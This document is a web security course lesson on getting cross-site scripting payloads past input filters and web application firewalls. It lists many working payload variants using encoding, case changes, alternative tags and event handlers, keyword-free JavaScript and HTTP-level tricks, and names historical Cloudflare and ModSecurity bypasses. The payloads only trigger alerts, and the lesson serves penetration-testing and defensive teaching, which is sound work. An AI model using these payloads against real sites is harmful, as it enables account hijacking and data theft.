# Unit 6: Cross-Site Scripting (XSS) — Topic 4: Filter Bypass Techniques

## Overview

Modern web applications deploy various defences to prevent XSS — input filters, output encoding, Web Application Firewalls (WAFs), and custom sanitisation logic. However, many of these defences have weaknesses that can be exploited through encoding tricks, alternative syntax, and creative payload construction. Understanding bypass techniques is critical for penetration testers to validate that defences are truly effective, and for developers to understand why superficial filtering is insufficient.

---

## 1. Common Filter Types and Their Weaknesses

```
+------------------------------+----------------------------------+
|  Filter Type                 |  Common Weakness                 |
+------------------------------+----------------------------------+
|  Blacklist (block keywords)  |  Incomplete lists, case bypass   |
|  Regex-based removal         |  Recursive injection, anchoring  |
|  HTML entity encoding        |  Context-dependent effectiveness |
|  Tag stripping               |  Incomplete parsing, nesting     |
|  WAF rules                   |  Encoding, chunking, smuggling   |
+------------------------------+----------------------------------+
```

### Why Blacklists Fail

```
Filter: Remove "script" from input
Attack: <scr<script>ipt>alert(1)</scr</script>ipt>

After filter removes inner <script></script>:
Result:  <script>alert(1)</script>    ← Payload reconstructed!
```

---

## 2. HTML Entity Encoding Bypass

When input is placed in an HTML context, browsers decode HTML entities before rendering. Filters that check raw input may miss encoded payloads.

### Decimal Encoding

```html
<!-- alert(1) in decimal HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Without semicolons (also valid) -->
<img src=x onerror=&#97&#108&#101&#114&#116&#40&#49&#41>
```

### Hexadecimal Encoding

```html
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

### Mixed Encoding

```html
<!-- Combine decimal, hex, and plain text -->
<img src=x onerror=&#x61;l&#101;rt&#40;1&#41;>
```

### Named Entities for Attribute Breakout

```html
<!-- Breaking out of attributes using entities -->
<a href="javascript&colon;alert(1)">click</a>
<iframe src="java&#x09;script:alert(1)">
```

---

## 3. Case Variation and Null Bytes

### 3.1 Case Variation

HTML is case-insensitive. Filters checking for lowercase keywords miss mixed-case input:

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
<Svg OnLoad=alert(1)>
<iMg sRc=x oNeRrOr=alert(1)>
```

### 3.2 Null Byte Injection

Null bytes (`%00`) can terminate string processing in some languages while browsers ignore them:

```html
<scri%00pt>alert(1)</scri%00pt>
<img src=x onerr%00or=alert(1)>
```

> **Note:** Null byte injection is mostly effective against legacy systems (PHP < 5.3, older Java servlets). Modern browsers and frameworks handle null bytes safely.

### 3.3 Whitespace Variations

Filters that expect standard spaces can be bypassed with alternative whitespace characters:

```
Standard space:   0x20
Tab:              0x09  (%09)
Newline:          0x0A  (%0A)
Carriage return:  0x0D  (%0D)
Form feed:        0x0C  (%0C)

Example:
<img%09src=x%09onerror=alert(1)>
<svg%0Aonload=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
```

---

## 4. Tag and Event Handler Alternatives

When common tags like `<script>` and `<img>` are blocked, use lesser-known HTML elements:

### Alternative Tags

| Blocked Tag    | Alternative                                       |
|----------------|---------------------------------------------------|
| `<script>`     | `<svg onload=...>`                               |
| `<img>`        | `<video><source onerror=...>`                    |
| `<script>`     | `<details open ontoggle=...>`                    |
| `<img>`        | `<input autofocus onfocus=...>`                  |
| `<script>`     | `<body onload=...>`                              |
| `<img>`        | `<marquee onstart=...>`                          |
| `<script>`     | `<math><mtext><table><mglyph><svg onload=...>`  |
| `<img>`        | `<object data="javascript:alert(1)">`            |

### Alternative Event Handlers

```html
<!-- When onerror, onload, onclick are blocked -->
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadeddata=alert(1) autoplay><source>
<meter onmouseover=alert(1)>0</meter>
<keygen onfocus=alert(1) autofocus>
```

### Tag Mutation Techniques

Some parsers normalise malformed HTML differently, creating injection opportunities:

```html
<!-- Unclosed tags -->
<svg onload=alert(1)//

<!-- Self-closing tricks -->
<img src=x onerror=alert(1)/>

<!-- Nested tag confusion -->
<a href="</a><img src=x onerror=alert(1)>">

<!-- Comment-based bypass -->
<!--><svg onload=alert(1)>-->
```

---

## 5. JavaScript Alternative Syntax

### 5.1 Avoiding Parentheses

```html
<!-- Backtick syntax (template literals) -->
<img src=x onerror=alert`1`>

<!-- throw with error handler -->
<img src=x onerror="window.onerror=alert;throw 1">

<!-- Location assignment -->
<svg onload=location='javascript:alert%281%29'>
```

### 5.2 Avoiding Quotes

```javascript
// String.fromCharCode
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// Regex source
alert(/XSS/.source)

// Template literals
alert`XSS`
```

### 5.3 Avoiding Specific Keywords

```javascript
// "alert" is blocked — alternatives
confirm(1)
prompt(1)
window['al'+'ert'](1)
self[atob('YWxlcnQ=')](1)          // Base64 for "alert"
top[/al/.source+/ert/.source](1)
Reflect.apply(alert, window, [1])
```

### 5.4 Function Construction Without Keywords

```javascript
// Using constructors
[].constructor.constructor('alert(1)')()
''['constructor']['constructor']('alert(1)')()

// Using Function()
new Function('alert(1)')()

// Using setTimeout / setInterval
setTimeout('alert(1)', 0)
setInterval('alert(1)', 1000)
```

---

## 6. WAF Bypass Techniques

### 6.1 Encoding Layers

```
Double URL Encoding:
  <  →  %3C  →  %253C
  >  →  %3E  →  %253E

If server decodes twice but WAF only checks once:
  %253Cscript%253Ealert(1)%253C/script%253E
  WAF sees: %3Cscript%3E... (encoded, safe)
  Server decodes to: <script>alert(1)</script>
```

### 6.2 Chunked Transfer Encoding

```http
POST /comment HTTP/1.1
Transfer-Encoding: chunked

1c
<script>alert(1)</script>
0
```

Some WAFs fail to reassemble chunked payloads before inspection.

### 6.3 HTTP Parameter Pollution

```
# WAF checks first parameter, server uses last
GET /search?q=safe&q=<script>alert(1)</script>

# Or split payload across parameters
GET /page?a=<script>alert(&b=1)</script>
```

### 6.4 Content-Type Manipulation

```http
# Some WAFs only inspect application/x-www-form-urlencoded
POST /api/comment HTTP/1.1
Content-Type: text/plain

{"comment":"<script>alert(1)</script>"}
```

### WAF Bypass Decision Tree

```
WAF blocks your payload?
  |
  |-- Try encoding (HTML entities, URL, double)
  |     |-- Still blocked? ↓
  |
  |-- Try case variation (ScRiPt, OnErRoR)
  |     |-- Still blocked? ↓
  |
  |-- Try alternative tags/events
  |     |-- Still blocked? ↓
  |
  |-- Try whitespace tricks (tabs, newlines)
  |     |-- Still blocked? ↓
  |
  |-- Try HTTP-level attacks (HPP, chunked)
  |     |-- Still blocked? ↓
  |
  |-- Try protocol-level bypass (Content-Type)
  |     |-- Still blocked? ↓
  |
  |-- Combine multiple techniques
```

---

## 7. Real-World Bypass Examples

### CloudFlare WAF Bypass (Historical)

```html
<svg/onload=self[`aler`+`t`]`1`>
```

### ModSecurity CRS Bypass

```html
<details/open/ontoggle=confirm`1`>
```

### Filter Removing `<script>` Tags

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

---

## Summary Table

| Bypass Category        | Technique                       | Example                             |
|------------------------|---------------------------------|-------------------------------------|
| Encoding               | HTML entities (dec/hex)         | `&#97;&#108;&#101;&#114;&#116;`    |
| Case manipulation      | Mixed case tags/events          | `<ScRiPt>`, `OnErRoR`             |
| Null bytes             | Inject %00 within keywords      | `<scri%00pt>`                      |
| Whitespace             | Tabs, newlines instead of space | `<img%09src=x%09onerror=...>`      |
| Alternative tags       | Uncommon HTML elements          | `<details>`, `<marquee>`          |
| JS alternatives        | Avoid parens, quotes, keywords  | `` alert`1` ``, `confirm(1)`      |
| Double encoding        | Multi-layer URL encoding        | `%253Cscript%253E`                 |
| HTTP-level             | HPP, chunked encoding           | Split payload across params        |

---

## Revision Questions

1. **Explain why blacklist-based XSS filters are fundamentally weaker than output encoding. Give a specific bypass example.**

2. **A WAF blocks `<script>`, `<img>`, `alert`, and `onerror`. Construct a payload that would bypass all four rules.**

3. **How does double URL encoding bypass a WAF, and what server-side condition makes this attack possible?**

4. **What is HTTP Parameter Pollution and how can it be used to split an XSS payload past a WAF?**

5. **Why do alternative whitespace characters (tab, newline, form feed) bypass some XSS filters?**

---

*Previous: [03-payload-crafting.md](03-payload-crafting.md) | Next: [05-impact-and-exploitation.md](05-impact-and-exploitation.md)*

---

*[Back to README](../README.md)*
